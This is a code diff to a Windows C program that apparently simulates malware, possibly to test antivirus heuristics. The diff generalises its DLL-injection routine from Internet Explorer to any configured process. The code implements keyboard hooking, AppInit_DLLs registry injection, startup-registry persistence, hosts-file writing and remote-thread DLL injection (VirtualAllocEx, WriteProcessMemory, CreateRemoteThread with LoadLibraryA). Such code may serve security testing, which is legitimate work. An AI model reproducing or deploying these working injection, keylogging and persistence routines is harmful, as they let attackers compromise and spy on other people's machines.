@@ -33,6 +33,7 @@ void print_error(char* fmt,...){
 }
 
 // Task functions
+
 #if HOOK_KEYBOARD==1
 HANDLE hFile;
 LRESULT CALLBACK hook_proc( int code, WPARAM wParam, LPARAM lParam ){
@@ -332,8 +333,8 @@ void dll_inject_registry(){
 			"AppInit_DLLs",			// value name 
 			0,                  // must be zero 
 			REG_SZ,      // value type 
-			(LPBYTE) HEUREKADLL_PATH,	// pointer to value data 
-			(DWORD) (strlen(HEUREKADLL_PATH)+1))) // data size
+			(LPBYTE) DLL_INJECT_DLL_PATH,	// pointer to value data 
+			(DWORD) (strlen(DLL_INJECT_DLL_PATH)+1))) // data size
 	{
 		print_error("Could not set AppInitDLL entry value."); 
 	}else{
@@ -377,9 +378,9 @@ void set_startup_registry(){
 }
 #endif
 
-#if DLL_INJECT_IE==1
+#if DLL_INJECT==1
 
-#ifdef DLL_INJECT_IE_CALL
+#ifdef DLL_INJECT_CALL
 void* GetPayloadExportAddr( LPCSTR lpPath, HMODULE hPayloadBase, LPCSTR lpFunctionName ) {
   HMODULE hLoaded = LoadLibrary( lpPath );
 
@@ -403,23 +404,23 @@ void* GetPayloadExportAddr( LPCSTR lpPath, HMODULE hPayloadBase, LPCSTR lpFuncti
 }
 #endif
 
-void dll_inject_ie(){
+void dll_inject(){
 	STARTUPINFO si;
     PROCESS_INFORMATION pi;
 
-	print_status("dll_inject_ie starts");
+	print_status("dll_inject starts");
 
 	HMODULE hKernel32=GetModuleHandle("Kernel32");
-	FARPROC aLoadLibrary=GetProcAddress(hKernel32,"LoadLibraryA");
-
+	
 	ZeroMemory(&si,sizeof(si));
 	si.cb=sizeof(si);
 	ZeroMemory(&pi,sizeof(pi));
 
-	DWORD aProcesses[1024], cbNeeded, cProcesses;
+	
     HANDLE hP=NULL;
 	DWORD hPid=0;
-
+	#ifdef DLL_INJECT_ENUM_PROC
+	DWORD aProcesses[1024], cbNeeded, cProcesses;
     if(EnumProcesses( aProcesses, sizeof(aProcesses), &cbNeeded ) )
     {
 		cProcesses = cbNeeded / sizeof(DWORD);
@@ -436,7 +437,7 @@ void dll_inject_ie(){
 					if ( EnumProcessModules( hProcess, &hMod, sizeof(hMod), &cbNeeded) ){
 						GetModuleBaseName( hProcess, hMod, szProcessName, sizeof(szProcessName)/sizeof(TCHAR) );
 					}
-					if (strstr(szProcessName,"iexplore")){
+					if (strstr(szProcessName,DLL_INJECT_ENUM_PROC)){
 						
 						hPid=aProcesses[i];
 						hP=OpenProcess(PROCESS_CREATE_THREAD|PROCESS_VM_WRITE|PROCESS_VM_OPERATION,FALSE,hPid);
@@ -450,8 +451,9 @@ void dll_inject_ie(){
 			}
 		}
     }
+	#endif
 	if (hP==NULL){
-		if( !CreateProcess( IE_PATH,   
+		if( !CreateProcess( DLL_INJECT_EXE_PATH,   
 			"",				// Command line
 			NULL,           // Process handle not inheritable
 			NULL,           // Thread handle not inheritable
@@ -471,18 +473,17 @@ void dll_inject_ie(){
 		hPid=pi.dwProcessId;
 	}
 	print_status("Process handle: %p",hP);
-	void* pLibRemote=VirtualAllocEx(hP, NULL, sizeof(HEUREKADLL_PATH),MEM_COMMIT, PAGE_READWRITE );
-	WriteProcessMemory(hP, pLibRemote, (void*)HEUREKADLL_PATH,sizeof(HEUREKADLL_PATH), NULL );
-	
+	void* pLibRemote=VirtualAllocEx(hP, NULL, sizeof(DLL_INJECT_DLL_PATH),MEM_COMMIT, PAGE_READWRITE );
+	WriteProcessMemory(hP, pLibRemote, (void*)DLL_INJECT_DLL_PATH,sizeof(DLL_INJECT_DLL_PATH), NULL );
 	HANDLE hThread=CreateRemoteThread( hP, NULL, 0,(LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32,"LoadLibraryA" ),pLibRemote, 0, NULL );
 
 	print_status("Remote Thread: %p", hThread);
 	WaitForSingleObject( hThread, INFINITE );
 
-#ifdef DLL_INJECT_IE_CALL!=NULL
+#ifdef DLL_INJECT_CALL!=NULL
 	HMODULE hInjected;
 	GetExitCodeThread( hThread, ( LPDWORD )&hInjected );
-	void* lpInit = GetPayloadExportAddr( (LPCSTR)HEUREKADLL_PATH, hInjected, DLL_INJECT_IE_CALL );
+	void* lpInit = GetPayloadExportAddr( (LPCSTR)DLL_INJECT_DLL_PATH, hInjected, DLL_INJECT_CALL );
 	if( lpInit != NULL ){
 		HANDLE hThread2 = CreateRemoteThread( hP, NULL, 0, (LPTHREAD_START_ROUTINE)lpInit, NULL, 0, NULL );
 
@@ -496,7 +497,7 @@ void dll_inject_ie(){
 	WaitForSingleObject(hP, INFINITE );
 	CloseHandle(hP);
 	//CloseHandle(pi.hThread);
-	print_status("dll_inject_ie ends");
+	print_status("dll_inject ends");
 }
 #endif
 
@@ -624,8 +625,8 @@ int main(int argc,char **argv){
 	write_hosts();
 	#endif
 
-	#if DLL_INJECT_IE==1
-	dll_inject_ie();
+	#if DLL_INJECT==1
+	dll_inject();
 	#endif
 
 	#if SET_STARTUP_REGISTRY==1
